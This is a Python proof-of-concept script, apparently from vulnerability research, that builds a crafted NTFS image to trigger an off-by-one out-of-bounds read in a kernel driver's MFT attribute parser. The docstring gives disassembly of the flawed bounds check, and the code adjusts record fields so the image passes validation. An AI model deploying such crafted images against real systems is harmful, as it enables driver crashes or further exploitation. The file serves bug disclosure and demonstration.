#!/usr/bin/env python3
"""lanes/ntfs: PoC for the parse_mft_entry attribute-walk off-by-one.

    poc_offbyone.py IN.img OUT.img [RECNO]

parse_mft_entry (szdrv_core.ko +0x12a4c, Ghidra 0x22a74) advances the attribute
offset and only then tests it, with `bytes_allocated < ofs` instead of `<=`:

    0012af8  add r4, r4, r2      ; ofs += attr->length
    0012afc  ldr r3, [r5, #0x1c] ; bytes_allocated
    0012b00  cmp r3, r4
    0012b08  bcc <error>         ; reject only if allocated < ofs
    0012b0c  ldr r3, [r5, r4]    ; *(u32*)(rec + ofs)  <- ofs may == allocated

so `ofs == bytes_allocated` is accepted and a 4-byte load happens one dword
past the end of the mft_record_size-sized record buffer.

This PoC stretches the LAST attribute of a metadata record so that
`attrs_offset + sum(lengths) == bytes_allocated` exactly. The out-of-bounds
dword is then the first four bytes of the *next* MFT record, i.e. the ASCII
magic "FILE" = 0x454c4946, which check_attrs rejects with a message that prints
the type it read. Seeing 0x454c4946 in that message is direct evidence that the
load happened past the record.
"""
import struct
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ntfslab import Ntfs, attrs  # noqa: E402


def main():
    src, dst = sys.argv[1], sys.argv[2]
    recno = int(sys.argv[3]) if len(sys.argv) > 3 else 3
    v = Ntfs(src)
    rec = Ntfs.unfixup(v.read_rec(recno), v.bps)
    assert rec[0:4] == b"FILE", "not a FILE record"
    alloc = struct.unpack_from("<I", rec, 0x1C)[0]
    al = [(o, t, ln) for (o, t, ln) in attrs(rec) if t != 0xFFFFFFFF]
    o, t, ln = al[-1]
    assert rec[o + 8] == 0, f"last attr type 0x{t:x} is non-resident; pick another record"
    new_len = alloc - o
    assert new_len >= 0x18 and new_len % 8 == 0, f"bad new_len {new_len:#x}"
    struct.pack_into("<I", rec, o + 4, new_len)
    # check_attrs (+0x2e0c) requires, for a resident attribute, exactly
    #     attr_len == value_offset + ((value_length + 7) & ~7)
    # so the value has to grow with the record-filling length.
    vofs = struct.unpack_from("<H", rec, o + 0x14)[0]
    struct.pack_into("<I", rec, o + 0x10, new_len - vofs)
    # bytes_in_use must stay <= bytes_allocated (check_mft_entry_hdr) -- make it
    # exactly the allocation so the record still looks self-consistent.
    struct.pack_into("<I", rec, 0x18, alloc)
    v.write_rec(recno, Ntfs.refixup(rec, v.bps))
    v.save(dst)
    print(f"rec{recno}: last attr @0x{o:x} type=0x{t:x} length 0x{ln:x} -> 0x{new_len:x}; "
          f"walk ends at ofs=0x{o + new_len:x} == bytes_allocated=0x{alloc:x}")
    nxt = v.d[v.rec_off(recno + 1):v.rec_off(recno + 1) + 4]
    print(f"dword at rec+0x{alloc:x} (start of rec{recno + 1}) = "
          f"0x{struct.unpack('<I', nxt)[0]:08x} ({bytes(nxt)!r})")


if __name__ == "__main__":
    main()
